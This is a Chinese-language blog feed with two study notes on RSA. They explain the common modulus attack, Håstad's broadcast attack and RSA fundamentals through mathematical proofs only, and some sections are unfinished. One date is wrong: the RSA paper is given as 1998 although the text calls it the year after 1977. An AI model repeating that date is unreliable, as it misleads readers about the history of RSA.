<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iyheart的博客</title>
  
  <subtitle>分享笔记和学习历程</subtitle>
  <link href="http://iyheart.github.io/atom.xml" rel="self"/>
  
  <link href="http://iyheart.github.io/"/>
  <updated>2026-01-22T04:23:32.716Z</updated>
  <id>http://iyheart.github.io/</id>
  
  <author>
    <name>iyheart</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RSA加密之早期攻击</title>
    <link href="http://iyheart.github.io/2026/01/20/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/%E6%AD%A3%E5%B8%B8RSA/RSA%E5%8A%A0%E5%AF%86%E4%B9%8B%E6%97%A9%E6%9C%9F%E6%94%BB%E5%87%BB/"/>
    <id>http://iyheart.github.io/2026/01/20/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/%E6%AD%A3%E5%B8%B8RSA/RSA%E5%8A%A0%E5%AF%86%E4%B9%8B%E6%97%A9%E6%9C%9F%E6%94%BB%E5%87%BB/</id>
    <published>2026-01-20T13:29:26.000Z</published>
    <updated>2026-01-22T04:23:32.716Z</updated>
    
    <content type="html"><![CDATA[<ul><li>对于目前的RSA加密来说，只介绍一些正常的RSA加密题型，而不会详细归纳RSA加密中考察某个数论知识点的题目。（当然如果是leak类型的题目还是会归纳的，但是如果是单单考察一个求$\phi(n)$的公式，那我觉得没什么必要）</li><li>接下来就介绍一下针对RSA加密的早期攻击方式，以便后续的RSA加密的学习。接下来就先来了解一下RSA加密的早期攻击：对于RSA加密早期的攻击，本篇博客中主要学习的是共模攻击、循环攻击、共明文攻击，对于相关明文攻击个人认为篇幅比较多，所以单开一篇博客进行论文的细读，进行学习。</li></ul><p><img src="/2026/01/20/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/%E6%AD%A3%E5%B8%B8RSA/RSA%E5%8A%A0%E5%AF%86%E4%B9%8B%E6%97%A9%E6%9C%9F%E6%94%BB%E5%87%BB/image-20260121010932547.png" alt="image-20260121010932547"></p><h1 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h1><ul><li>共模攻击英文全称为<code>Common Modulus Attack</code>，出现该攻击的原因是由于一个早期提出的密码学协议<code>共模协议</code>，该协议的具体内容为：<ul><li>由一个密钥机构（即可信第三方）生成一个RSA模数，并向系统内的用户分发使用同一模数的和法密钥对。</li><li>在该协议中，用户的私钥仅为$(d,N)$，因此用户并不知道模数$N$的因数分解即不知道$(p,q)$的值。</li><li>该方案的初衷是只有中央密钥机构掌握该公共模数的分解信息。</li></ul></li><li><p>在<code>1983</code>年，<code>Simmons</code>在这篇文章<code>A &quot;weak&quot; privacy protocol using the RSA crypto algorithm.</code>指出，当同一明文使用具有<strong>相同模数</strong>且<strong>公钥指数互素</strong>的两个不同公钥进行加密时，会存在协议失效的问题。接下来具体说明一下：</p><ul><li>给定两个密文$c_1,c_2$，以及两个公钥对$(e_1,n)，(e_2,n)$，其中公钥对中$(e_1,e_2)=1$。<code>Simmons</code>证明了在这种已知条件下，可以很容易地计算出原始明文。</li><li>由于$(e_1,e_2)$互素，那么我们就可以轻易地求出整数$a_1$和$a_2$，$a_1e_1+a_2e_2=1$（可以由裴蜀定理得到该式子）</li><li>对于任意明文$m$，给定的$c_1=m^{e_1}~mod(~N),c_2=m^{e_2}~mod(~N)$，只需要计算$c_1^{a_1}*c_2^{a_2}~mod(~N)$，即可得到明文。</li><li>因为在$Z<em>N$中有：$c</em>{1}^{a<em>1}*c</em>{2}^{a_2}=m^{a_1e_1}*m^{a_2e_2}=m^{a_1e_1+a_2e_2}=m~mod(~N)$</li><li>这类攻击可以由任何能够获取公钥并且观察到这两个密文的人实施</li></ul></li><li><p>在<code>1984</code>年，<code>DeLaurentis</code>在这篇文章<code>A further weakness in the common modulus protocolfor the RSA cryptoalgorithm</code>证明了<code>共模协议</code>是完全不安全的。他指出只要掌握任意一组公钥—私钥对，就足以计算出在相同模数下对应与任何其他公钥的有效私钥，<strong>具体定理如下</strong>：</p><ul><li>设$(e,N)$是一个有效的RSA公钥，其私钥对应的是$(d,N)$；设$(e_1,N)$是另一个有效的公钥，并且满足$e_1≠e$。</li><li>在已知$(e,d,N,e_1)$的情况下，公钥$(e_1,N)$对应有效的解密指数$d_1$能在关于$log(N)$的多项式时间内计算得到。</li><li>$d_1$的计算公式如下：$d_1=e_1^{-1}~mod(~\frac{ed-1}{gcd(e_1,ed-1)})$</li><li><p>证明如下：</p><ul><li>由于$\phi(N)$是$\lambda(N)$的倍数，所以密钥等式就可以写成$ed-1=k\lambda(N)$，$k$是一个正整数。</li><li>对于有效的公钥指数$e_1$，必须满足$gcd(e_1,\lambda(N))=1$，因此就有$gcd(e_1,k\lambda(N))=gcd(e_1,k)=k’$，也就有$k’|k$。</li><li>设$\tilde{k}=\frac{k}{k’}≥1$，所以就有$\frac{ed-1}{gcd(e_1,ed-1)}=\frac{k\lambda(N)}{k’}=\tilde{k}\lambda(N)$。</li><li>因此对于私钥指数$d_1$就满足$e_1d_1=1+k_1(\tilde{k}\lambda(N))$，其中$k_1$是正整数。</li><li>因此就有$e_1d_1\equiv1~(~mod~\lambda(N))$，所以$d_1$是公钥$(e_1,N)$的一个有效私钥指数。</li><li>所以可以在关于$log(N)$的多项式时间内计算得到$d_1$</li></ul></li><li><p>此外<code>DeLaurentis</code>利用一个归因与<code>Simmons</code>的思想证明了：在已知单个<code>公钥-私钥</code>对的情况下，可以使用概率多项式时间的<code>Las Vegas</code>算法对模数进行分解（<code>Las Vegas</code>算法是结果一定正确，只是运行时间是随机的随机算法）。在给定$e$和$d$的条件下，只需要计算$\phi(N)$的一个倍数，即$ed-1=k\phi(N)$，然后应用<code>Miller</code>的结论（该结论就是在已知$\phi(N)$的某个倍数时，可以以概率方式分解$N$），因此<code>共模协议</code>不安全。</p></li></ul></li></ul><h1 id="广播攻击"><a href="#广播攻击" class="headerlink" title="广播攻击"></a>广播攻击</h1><ul><li>另一个出现协议失效的情况就是几个相关的明文消息被小公钥指数和不同的模数加密。同样的，对这个失效的协议攻击经常指的是<code>Håstad&#39;s Broadcast attack</code>，也就是<code>Håstad广播攻击</code>。该攻击分为两类，一类就是共明文攻击，另一类就是消息相关攻击。</li><li>这里主要介绍共明文攻击，该协议失效是出现在相同的明文$m$被几个公钥$(e,N_i)$加密，每个公钥都有相同的公钥指数$e$和不同的模数$N_i$。这个协议失效的攻击在<code>1985</code>年由<code>Håstad</code>发表的两篇文章<code>On using RSA with low exponent in a public key network</code>和<code>Solving simultaneous modular equations of low degree</code></li><li>该攻击的具体定理如下：<ul><li>设$(e,N_1),…,(e,N_l),l≥e$，这些公钥对都是有效的RSA公钥，其中模数$N_i,i=1,…,l$两两互素</li><li>设$N<em>0=min{N_1,…,N_l},N=\Pi^{l}</em>{i=1}N_i$</li><li>对于任何一个消息$m&lt;N_0$，给定$c_i=m^e~mod~(~N_i)$和$(e,N_i),i=1,…,l$，明文$m$是能在关于$log(N)$的多项式时间内计算出来的。</li><li>证明如下：<ul><li>由于模数$N_1,…,N_l$两两互素，由中国剩余定理可以用$c_i$和$N_i$得到$C\equiv m^e~mod(~N)$。</li><li>因为$m&lt;N_0$，这就使得$m^e&lt;N_1N_2…N_l=N$，因此$C=m^e$。</li><li>在整数范围内计算$C=m^e$的e次方根，即可得到明文$m$，由于所有计算都可以在关于$log(N)$的多项式时间内完成，因此结论成立。</li></ul></li></ul></li></ul><h1 id="循环攻击"><a href="#循环攻击" class="headerlink" title="循环攻击"></a>循环攻击</h1><ul><li>循环攻击，英文名称为<code>Cycling Attacks</code>，</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="共模攻击"><a href="#共模攻击-1" class="headerlink" title="共模攻击"></a>共模攻击</h2><ul><li>关于协议错误如果还要拓展，可以参见：<ul><li><code>Moore</code>写的<code>Protocol failures in cryptosystems. Proceedings of the IEEE</code></li><li><code>Simmons</code>写的<code>An RSA-related number-theoretic surprise. In Computer Systems Theory, Technology, and Applications,Monographs in Computer Science, chapter 39, pages 269–271. Springer New York, 2004</code></li></ul></li><li><p>共模协议在早期曾被反复提出，是一种较早且多此出现的方案，但最终证明是完全不安全的。例如在下面论文中提到这种类型的协议曾被多次<code>重新发明</code></p><ul><li><code>DeLaurentis</code>所写的<code>A further weakness in the common modulus protocol for the RSA cryptoalgorithm</code></li><li><code>Håstad</code>所写的<code>On using RSA with low exponent in a public key network. In H. C. Williams, editor, CRYPTO, volume 218 of Lecture Notes in Computer Science, pages 403–408. Springer, 1985</code></li><li><code>Moore</code>写的<code>Protocol failures in cryptosystems. Proceedings of the IEEE</code></li></ul></li><li><p>在已知<code>RSA公钥和私钥指数</code>的情况下，对RSA模数进行分解的确定性多项式时间算法，直到在发现概率型多项式时间算法二十多年之后才被找到。这种确定性方法利用了<code>Coppersmith</code>的小根方法来求解二元整数方程的小根，最早由<code>May</code>于<code>2004</code>年提出，随后又被<code>Coron</code>和<code>May</code>进一步改进。</p><ul><li><code>May</code>所写的<code>Computing the RSA secret key is deterministic polynomial timeequivalent to factoring. In M. K. Franklin, editor, CRYPTO, volume3152 of Lecture Notes in Computer Science, pages 213–219. Springer,2004.</code></li><li><code>Coron 和 May</code>所写的<code>Deterministic polynomial-time equivalence ofcomputing the RSA secret key and factoring. *Journal of Cryptology*,20(1):39–50, 2007.</code></li></ul></li></ul><h2 id="共明文攻击"><a href="#共明文攻击" class="headerlink" title="共明文攻击"></a>共明文攻击</h2><h2 id="循环攻击"><a href="#循环攻击-1" class="headerlink" title="循环攻击"></a>循环攻击</h2>]]></content>
    
    
    <summary type="html">前言：休息了有段时间了，可以开始学习了。</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="RSA" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/RSA/"/>
    
    
  </entry>
  
  <entry>
    <title>RSA加密原理</title>
    <link href="http://iyheart.github.io/2026/01/08/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86/"/>
    <id>http://iyheart.github.io/2026/01/08/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86/</id>
    <published>2026-01-08T07:23:10.000Z</published>
    <updated>2026-01-09T17:10:12.120Z</updated>
    
    <content type="html"><![CDATA[<ul><li>感觉自己写的RSA密码分析还是比较杂，而且还有很多没有补充完整的，思来想去还是把从头开始把每个东西都完善一下。我之前打算的分类是每个RSA攻击方式，在正常RSA加密、多幂RSA加密、多素数RSA加密、对偶RSA加密、共素数RSA加密等都分析一遍。</li><li>但是这样的分类还是有点乱，最终决定依然按照<code>《Cryptanalysis of RSA and Its Variants (M. Jason Hinek)》</code>这本书的分类来进行分类。（之后如果有时间，再根据我上面的想法分个类。）</li><li>这篇博客正式开始我的RSA加密的密码分析学的学习，之前一直想写这个博客，但是由于基础知识有限以及时间关系一直就鸽了，现在基础知识跟上来了，直接开始疯狂学习。</li><li>之前也做过不少RSA加密的题型，所以我根据集合的划分，将RSA加密题型进行分类，尽我所能的将题型分类成如下图所示，我会根据我的分类进行学习。目前还没分类完成，只能说边学边分类吧（此图会不定期跟新与完善）。这个分类的构建有参考这本国外书籍：<code>《Cryptanalysis of RSA and Its Variants  (M. Jason Hinek)》</code></li></ul><p><img src="/2026/01/08/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86/image-20260108152745095.png" alt="image-20260108152745095"></p><h1 id="公钥密码学"><a href="#公钥密码学" class="headerlink" title="公钥密码学"></a>公钥密码学</h1><ul><li>公钥密码学这个概念在<code>1970年~1980年</code>之间流行起来的，这个概念是被<code>Diffie、Hellman、Merkle</code>这三个人提出的。如果想要了解公钥密码学的起源，可以参考<code>Diffie</code>所写的<code>The first ten years of public-key cryptography</code>。</li><li>基于Douglas R. Stinson（道格拉斯·R·斯廷森），对于密码系统的定义，我们在公钥密码学中使用下面的定义：<ul><li>公钥密码学五元组$(P,C,K,E,D)$</li><li>$P$是明文的有限集合</li><li>$C$是密文的有限集合</li><li>$K$是密钥的有限集合，被称为密钥空间。</li><li>$E$是加密映射的有限集合，所有的公钥加密算法都属于这个集合</li><li>$D$是解密映射的有限集合，所有的公钥解密算法都属于这个集合</li><li>对于每一个密钥$k\in K$，有一个加密规则（其实也就是一个映射）$enc_K\in E$，并且对应着有一个正确的解密规则（也可以理解为一个映射）$dec_K \in D$。<ul><li>对于每一个加密映射$enc_K: P\rightarrow C$和解密映射$dec_K: C\rightarrow P$，这两个函数有$dec_K(enc_K(m))=m,m\in P$</li><li>对于每一个密钥$k \in K$以及每一个明文$m \in P$，$enc_K(m)$和$dec_K(enc_K(m))$都非常容易计算。</li><li>对于几乎所有$k \in K$来说，任何与$dec_K$等价且可有效计算的算法，都在计算上不能仅有$enc_K$（这是一个映射）推导得到。也就是说，在不知道$dec_K$的情况下，解密是困难的。</li><li>加密规则$enc_K$是公开的而解密规则$dec_K$是非公开的。</li></ul></li></ul></li><li>其实换一种角度思考公钥密码系统，从另一种角度看，一个公钥密码系统包含了三个有效的可计算的算法：<ul><li>密钥生成算法：该算法定义了密钥空间$K$</li><li>加密算法和解密算法：这两个算法共同定义了明文空间$P$和密文空间$C$</li></ul></li></ul><h1 id="rsa加密原理"><a href="#RSA加密原理" class="headerlink" title="RSA加密原理"></a>RSA加密原理</h1><ul><li><p>RSA加密体制是第一个被公开发表的公钥密码体制。RSA密码提示最早由<code>Gardner</code>在<code>1977年</code>于<code>《Scientific Amrican》</code>上发表的一篇文章中介绍。其完整的研究论文则于次年<code>1998年</code>由发明者<code>Rivest、Shamir和Adleman</code>发表，这三位作者都隶属于麻省理工学院，该密码体制最初被称为<code>MIT公钥密码体制</code>。</p></li><li><p>接下来以非专业的术语大致讲解一下RSA加密和解密过程：</p><ul><li>定义：要加密的明文为$m$，加密后得到的密文为$c$</li><li>前提准备1：先选取两个素数$p、q$，计算这两个素数的乘积$n=p*q$</li><li>前提准备2：计算$n$的欧拉函数，$\phi(n)=(p-1)*(q-1)$</li><li>公钥的生成：生成一个公钥$e$，要求$1&lt;e&lt;\phi(n)$，且$e$为整数，还需要满足$gcd(e,\phi(n))=1$（也就是两者互素）</li><li>私钥的生成：确定私钥$d$，私钥需要满足$e*d\equiv1~mod~(~\phi(n)~)$</li><li>加密算法如下：</li></ul><script type="math/tex; mode=display">c = m^e~mod~(~n)</script><ul><li>解密算法如下：</li></ul><script type="math/tex; mode=display">m = c^d~mod(~n)</script><ul><li>解密正确性验证：<ul><li>通过欧拉定理以及欧拉函数可以将原本计算量比较大的指数运算转换为求解逆元的运算。如果稍微了解一下求解逆元的过程，其实就知道求逆元的过程本质上就是解不定方程，还需要用上欧几里得算法。</li><li>由$e<em>d\equiv1~mod(~\phi(n))$就可以得到：$e</em>d=1+k*\phi(n)$</li><li>所以$c^d\equiv (m^{e})^{d}\equiv m^{ed}~mod(n)$</li><li>通过代换就可以得到$c^d\equiv m^{ed}\equiv m^{k*\phi(n)+1}~mod(n)$</li><li>通过欧拉定理有$a^{\phi(n)}\equiv 1~mod(~n),gcd(a,n)=1$</li><li>最后得到$c^d \equiv m^{ed} \equiv m^{k<em>\phi(n)+1}\equiv m^{k</em>\phi(n)}*m\equiv m~mod(~n)$</li></ul></li><li>$(n,e)$为公钥对，$(p,q,d)$为私钥对</li></ul></li><li><p>接下来使用比较专业的术语再描述一下RSA公钥加密体制的具体算法：</p><ul><li><p>定义明文空间与密文空间：生成两个大素数$p、q$，让$N = pq$，$P=C=Z_N$（即明文空间和密文空间就是整数模N的集合，其实就是$[0,n-1]$这个范围内的整数集）</p></li><li><p>定义密钥空间：$K = {(N,p,q,e,d):ed\equiv 1~mod(~\phi(N))}$，其中$\phi(N)=(p-1)(q-1)$是欧拉函数。</p></li><li><p>定义加密、解密规则：</p><ul><li>对于每个密钥$k\in K,k=(N,p,q,e,d)$。</li><li>有加密规则$enc_K:Z_N\rightarrow Z_N$，满足算法$enc_K(x)=x^{e}~mod(~N)$。</li><li>有解密规则$dec_K:Z_N\rightarrow Z_N$，满足算法$dec_K(y)=y^d~mod(~N)$</li></ul></li><li><p>其中$x,y\in Z_N$，$(e,N)$这一对被称为RSA公钥，$(d,p,q)$这个三元组被称为RSA私钥。</p></li><li><p>加密函数$enc_K(x)=x^e~mod(~N)$，其中$N$是不能在一定时间内分解出来，并且满足$gcd(e,\phi(N))=1$。这个加密函数就被叫做<code>RSA function（RSA函数）</code>或者<code>RSA primitive（RSA基本式）</code></p></li><li><p>$N=pq$被叫做<code>RSA modulus（RSA模数）</code>，两个素数$p、q$被叫做<code>RSA primes（RSA素数）</code></p></li><li><p>$e$被叫做<code>public exponent（公钥指数）</code>或者<code>encrypting exponent（加密指数）</code></p></li><li><p>d被叫做<code>private exponent（私钥指数）</code>或者<code>decrypting exponent（解密指数）</code></p></li><li><p>由于公私钥指数必须满足$ed\equiv 1~mod(~\phi(N)~)$，所以有$ed=1+k\phi(N)$其中k是小整数（相比p、q、n来说），而$ed=1+k\phi(N)$这个等式就被称为<code>RSA key equation（RSA密钥等式，简称密钥等式）</code></p></li><li><p>解密规则正确性：</p><ul><li>对于与$N$互素的元素$a$，由欧拉定理可以得到$a^{\phi(N)}\equiv 1~(mod~N)$</li><li>给定公钥$(e,N)$，以及一个明文消息$m\in Z_N,gcd(m,N)=1$，计算得到密文$c=m^e~mod(~N)$</li><li>使用解密规则，用上欧拉定理与密钥等式有：</li></ul><script type="math/tex; mode=display">\begin{align}c^d~(mod~N) &\equiv (m^e)^d~mod(~N)\\&\equiv m^{ed} ~mod(~N)\\&\equiv m^{1+k\phi(N)} ~mod(~N)\\&\equiv m*(m^{\phi(N)})^k~mod(~N)\\&\equiv m ~mod(~N)\end{align}</script><ul><li>由于$m \in Z_N$，所以$c^d\equiv m~mod(~N)$可以直接用等号连接$c^d = m~mod(N)$</li></ul></li><li><p>除此之外$gcd(m,N)&gt;1$这种情况应该尽量避免，因为在$gcd(m,N)&gt;1$这一情况下使用RSA加密计算出密文$c$后，$c$一定会满足$gcd(c,N)=p$或者$gcd(c,N)=q$</p></li></ul></li></ul><h1 id="rsa加密进一步理解"><a href="#RSA加密进一步理解" class="headerlink" title="RSA加密进一步理解"></a>RSA加密进一步理解</h1><h2 id="欧拉函数与卡迈尔函数"><a href="#欧拉函数与卡迈尔函数" class="headerlink" title="欧拉函数与卡迈尔函数"></a>欧拉函数与卡迈尔函数</h2><blockquote><p><strong>欧拉函数</strong>：</p><p>在数论中，对正整数<code>n</code>，欧拉函数$\phi(n)$是小于等于<code>n</code>的正整数中与<code>n</code></p><p>互素的数的个数，又称为欧拉总计函数。其公式如下：</p><ul><li>$n$能被标准分解为$n=p_1^{k_1}p_2^{k_2}…p_r^{k_r}$</li><li>$\phi(n)$有如下公式$\phi(n)=p_1^{k_1-1}p_2^{k_2-1}…p_r^{k_r-1}(p_1-1)(p_2-1)…(p_r-1)$</li></ul><p><strong>卡迈尔函数</strong>：</p><p>在数论中，正整数$n$的卡迈尔函数$\lambda(n)$定义为满足下列条件的最小正整数$m$，满足$a^{m}\equiv1~mod(~n)$，其中$a$为任意与$n$互素的整数。其递推公式如下：</p><script type="math/tex; mode=display">\lambda(n)=\begin{cases}\phi(n),&n=1、2、4,或奇质数幂,\\\frac{1}{2}\phi(n),&如果n=2^r,r≥3,\\lcm(\lambda(n_1),\lambda(n_2),...,\lambda(n_k)),&如果n=n_1n_2...n_k,且n_1,n_2,...,n_k是不同质数的幂\end{cases}</script></blockquote><ul><li>RSA加密中，注意到有一个比较特别的地方，就是公钥指数$e$和私钥指数$d$在模$\phi(N)$下互为逆元，这个条件是能用解密规则将密文恢复成明文充分条件。而能解密出明文的必要条件是，公钥指数和私钥指数在模$N$的卡迈尔函数$\lambda(N)$下互为逆元。</li><li>因此，只需要在$\lambda(N)$的某个倍数下，使用公钥指数和私钥指数互为逆元即可。从这一点其实可以看出$\phi(N)$是$\lambda(N)$的倍数。这其实就允许我们在密钥生成算法中使用到$\phi(N)$。在当前的RSA标准和应用中公钥和私钥指数被定义为在模$\lambda(N)$下互为逆元即可。</li></ul><script type="math/tex; mode=display">\begin{align}\phi(N)&=(p-1)(q-1)\\&=gcd(p-1,q-1)lcm(p-1,q-1)\\&=gcd(p-1,q-1)lcm(\lambda(p),\lambda(q))\\&=gcd(p-1,q-1)\lambda(N)\end{align}</script><ul><li>在一般的讨论中，考虑RSA加密实例就公私钥指数的生成就两种情况：<ul><li>要么就是公私钥指数在$\lambda(N)$下互为逆元</li><li>要么就是公私钥指数在$\phi(N)$下互为逆元</li></ul></li></ul><h2 id="平衡素数"><a href="#平衡素数" class="headerlink" title="平衡素数"></a>平衡素数</h2><ul><li>在一般的RSA加密中，只考虑平衡素数的情况，平衡素数其实就是两个RSA的二进制位数是相同的，其实就是<code>p、q</code>都是<code>512位</code>的二进制素数，不讨论<code>p</code>的二进制位数为<code>512</code>，而<code>q</code>的二进制位数为<code>300</code>这种情况（当然有的密码分析题目是会讨论的。）</li><li>这样对于$p、q$以及$N=pq$来说就有如下的一个不等式关系：</li></ul><script type="math/tex; mode=display">4<\frac{1}{2}N^{\frac{1}{2}}<p<N^{\frac{1}{2}}<q<2N^{\frac{1}{2}}</script><ul><li>在这种平衡素数的情况下，$N$与$\phi(N)$的差值也满足一个不等式关系，不妨假设$p&lt;q&lt;2p$，推导如下：</li></ul><script type="math/tex; mode=display">\begin{align}|N-\phi(N)|&=|N-(p-1)(q-1)|\\&=|N-(N-p-q+1)|\\&=|p+q-1|\\&<N^{\frac{1}{2}}+2N^{\frac{1}{2}}=3N^{\frac{1}{2}}\end{align}</script><ul><li><p>因此其实可以得到一个结论：模数$N$和$\phi(N)$在二进制表示的高位部分有大量重合，比特结构高度相关（大概占N位数的一半）,因为两数相减后的结果是小于$3N^{\frac{1}{2}}$的。</p><ul><li>像这样高位部分有大量重合，比特结构高度相关也被叫做<code>最高有效位(MSB Most Significant Bit)</code></li><li>与之对应的低位部分有大量重合，比特结构高度相关也被叫做<code>最低有效位(LSB Least Significant Bit)</code></li></ul></li><li><p>由此就使用字母$s$表示差值：</p></li></ul><script type="math/tex; mode=display">s:=N-\phi(N)=p+q-1<3N^{\frac{1}{2}}</script><h2 id="非形式化算法描述"><a href="#非形式化算法描述" class="headerlink" title="非形式化算法描述"></a>非形式化算法描述</h2><ul><li><p>使用非形式化的算法描述RSA的这个公钥密码系统，对RSA加密算法做出如下定义：</p><ul><li>密钥生成：<ul><li>随机生成两个平衡素数$p、q$，并计算他们的乘积，$N=pq$，其中$N$是<code>n比特</code>的模数。</li><li>选择一个公钥指数$e$，公钥指数必须满足与$p-1$和$q-1$互素。</li><li>接下来利用$ed\equiv1~mod(~\lambda(N))$或者是$ed\equiv 1~mod(~\phi(N)~)$，计算出私钥$d$</li><li>算法输出公钥对$(e,N)$和私钥对$(d,p,q)$</li><li>这个算法可以选择性的接受更多的参数，用于指定公私钥的大小。在这种情况下，一旦素数生成完成，就随机选取满足所指定大小的公钥指数，而另一个指数则通过逆元计算得到</li></ul></li><li>加密过程：加密算法使用公钥对$(e,N)$，明文$m=Z_N$，输出的是密文$c=m^e~mod(~N)$</li><li>解密过程：解密算法使用私钥对$(d,p,q)$，密文$c=Z_N$，输出的是$m=c^d~mod(~N)$</li></ul></li><li><p>还需要特别注意的就是，每当其中一个指数由另一个指数通过取模逆元的方式计算得到，这个指数非常大的概率将会是<code>满位数或满尺寸</code>（这个指数与$\phi(N)$或者是$\lambda(N)$位数相同）。</p><ul><li>例如，当指数是模$\phi(N)$下的逆元，一个满位的指数将大致与$\phi(N)$相同。由于$N$与$\phi(N)$具有相同的位数，因此可以推出，满尺寸指数在规模上大致与RSA模数相当。</li><li>即使指数可能是在模$\lambda(N)$下的逆元，大概率生成的也是满位的一个指数。因为在随机生成RSA素数的情况下，$\lambda(N)$有很高的概率与$\phi(N)$具有近似相同的位数。</li><li>简单说其实就是$\phi(N)$与$\lambda(N)$的位数在期望意义下非常接近。</li></ul></li><li><p>其实也可以构造同时具有<code>小公钥指数</code>和<code>小私钥指数</code>的RSA实例，然而一般情况下仅考虑至多只有一个小指数较小的RSA实例。</p></li><li><p>注意：我们所研究的RSA密码分析学与实际工程中的差别还是比较大的。实际工程中会采用例如<code>PKCS #1</code>等工业标准，并配合使用<code>随机化填充方案</code>，这些填充能防止某些攻击。</p></li></ul><h1 id="rsa的安全"><a href="#RSA的安全" class="headerlink" title="RSA的安全"></a>RSA的安全</h1><ul><li><p>RSA的安全性依赖于解决RSA问题的困难性，<code>RSA问题(RSA problem)</code>描述如下：给一个RSA公钥对$(e,N)$和密文$c=m^e~mod(~n)$，RSA问题是计算明文$m$。本质上就是求模$N$意义下的<code>e</code>次方根，或者说是对RSA函数进行求逆操作。</p></li><li><p>由于目前无法确定RSA问题在理论上的真实难度，因此我们实际上依赖于一个关于其困难性的假设。这个假设被称为<code>RSA假设(RSA assumption)</code>，其断言：当明文$m\in Z_N$是随机选择的，且模数足够大并由随机生成的素数组成时，RSA问题是难以求解的。</p></li></ul><blockquote><p>从RSA被提出以来，公开领域内尚无任何证据表明RSA假设是不成立的。</p></blockquote><h2 id="整数分解"><a href="#整数分解" class="headerlink" title="整数分解"></a>整数分解</h2><ul><li>另一个于RSA安全性普遍联系的问题其实就是著名的<code>整数分解(Integer Factorization)</code>问题。整数分解问题就是找到整数的一个非平凡因子。</li><li>如果RSA的模数能够被成功分解，那么对于任意的合法公钥指数$e$，都可以高效地计算出私钥指数d，这就使得使用公钥$(e,N)$加密后的数据都能被轻松解密。因此RSA问题的求解难度不会高于整数分解问题。（目前尚不清楚反过来是否成立，也就是是否能够通过求解RSA问题高效地解决整数分解问题。这是关于RSA的最重要的公开未解问题之一。）</li><li>已经有研究表明，对某些特定公钥指数，RSA问题可能比整数分解问题更容易求解，但是证件目前还不足。</li><li>尽管RSA问题在某些情况下可能确实比整数分解问题更容易，但在实际应用中，人们通常假设二者在安全性上是等价的。一个RSA实例的安全级别通常基于对其模数分解难度的估计。例如，使用当前已知最优的通解算法<code>广义数域筛(GNFS General Number Field Sieve)</code>，预计对一个1024位的模数进行分解大约需要$2^{80}$次运算。因此，通常认为<code>1024位</code>的RSA能提供与<code>80位</code>一次性密码本相当的安全强度。</li></ul><h2 id="破解rsa"><a href="#破解RSA" class="headerlink" title="破解RSA"></a>破解RSA</h2><ul><li><p>对于破解一个密码系统，存在多种不同的定义，按照从难到易可以分为（这个顺序也是破解密码系统的严重程度）：</p><ul><li>完全破解(total break)：攻击者能够恢复完整的密钥，或者等价地对任意密文都能解出明文。</li><li>部分破解(partial break)：攻击者无法完全解密，但可以从密文中恢复某些关于明文的非平凡信息。</li><li>语义破解(semantic break)：攻击者可以区分两个等长明文的加密结果，即能在密文中获得任何与明文相关的优势信息。</li></ul></li><li><p>由于整数分解问题包含了RSA问题，所以可以通过分解模数N来攻击RSA加密。整数分解问题是可以完全破解RSA加密的，因为分解出来N后我们就可以很快计算出私钥对。有以下几种方式可以分解N：</p><ul><li>可以使用已知的整数分解方法对该模数$N$进行分解。</li><li>可以通过求私钥$d$的方法，分解模数$N$。</li><li>可以通过求$\phi(N)$或者$\lambda(N)$的方法，分解模数$N$。</li></ul></li><li><p>注解：根据上面这个我就对RSA加密的题型做出了分类</p></li><li><p>破解RSA加密有许多不同的方法，包括但不限于侧信道攻击、社会工程学攻击，社会工程学攻击这里不讨论，侧信道攻击如下：</p><ul><li>故障注入攻击</li><li>时间攻击</li><li>功耗分析攻击</li><li>分支分析攻击</li></ul></li><li>但是对于大部分CTF密码题来说是脱离实际应用的物理环境的（有的时候可能会考到偏实战的侧信道攻击），但是目前我学习的RSA攻击方式都是基于RSA密码体制的数学结构，并利用了某些特定的参数选择（比如：小公钥指数或者小私钥指数）。甚至还有一些部分私钥攻击，这种情况只关心已知部分私钥如何攻击RSA，而不关系这个部分私钥是如何获取的（一般要社工或者侧信道获取可能吧。）</li></ul><h2 id="rsa的同态性"><a href="#RSA的同态性" class="headerlink" title="RSA的同态性"></a>RSA的同态性</h2><ul><li>如果不太了解同态加密的话，可以先跳过这个，所谓同态加密其实就是可以在密文上进行加法运算（或者是乘法运算），而解密后的明文其实是密文对应明文的乘法运算。</li><li>对于RSA加密来说，我们有两个明文$m_1、m_2$，我们可以得到$m=m_1m_2$。接下来我们对这三个明文进行加密操作可以得到：</li></ul><script type="math/tex; mode=display">c_1 = m_1^e~mod(~N)\\c_2=m_2^e~mod(~N)\\c = m^e~mod(~N)</script><ul><li>对于这三个加密后的密文其实仍然会保持乘法关系，也就是说使用相同公钥对生成的密文进行乘法运算，解密后得到的明文也相当于是两个明文进行乘法运算得到的结果。</li></ul><script type="math/tex; 